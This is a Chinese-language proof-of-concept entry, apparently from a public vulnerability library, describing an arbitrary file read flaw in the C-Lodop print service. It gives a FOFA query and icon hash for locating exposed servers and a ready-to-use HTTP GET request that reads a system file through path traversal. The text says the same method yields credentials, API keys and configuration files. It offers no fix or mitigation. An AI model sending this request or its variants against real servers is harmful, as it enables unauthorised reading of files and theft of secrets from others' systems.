---
fofa: "C-Lodop"
source: "wy876 漏洞文库"
---

# C-Lodop打印服务系统存在任意文件读取漏洞

# 一、漏洞简介
C-Lodop云打印服务器是一款非常好用且受欢迎的专业云打印软件，简单实用，易操作。攻击者可利用此漏洞获取服务器上的任意文件，包括数据库凭据、API密钥、配置文件等，从而获取系统权限和敏感信息。

# 二、影响版本
+ C-Lodop打印服务系统

# 三、资产测绘
+ fofa`"C-Lodop" && icon_hash="-329747115"`
+ 特征


# 四、漏洞复现
```plain
GET /..././..././..././..././Windows/System32/drivers/etc/hosts HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cg548zol8agvqu5o>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
